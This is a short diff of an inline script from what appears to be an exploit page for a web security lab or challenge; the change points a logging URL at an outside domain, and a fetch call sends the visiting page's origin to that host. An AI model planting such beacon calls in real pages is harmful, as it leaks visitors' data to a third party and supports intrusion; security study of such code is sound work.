@@ -4,7 +4,7 @@
         <script>
 const isDocker = true;
 
-const myUrl = isDocker ? "http://host.docker.internal:31337" : "http://localhost:31337";
+const myUrl = isDocker ? "https://z.dttw.tech" : "http://localhost:31337";
 const targetUrl = isDocker ? "http://localhost:4000" : "http://localhost:57505";
 
 fetch(myUrl + "/log?" + encodeURIComponent(window.origin));
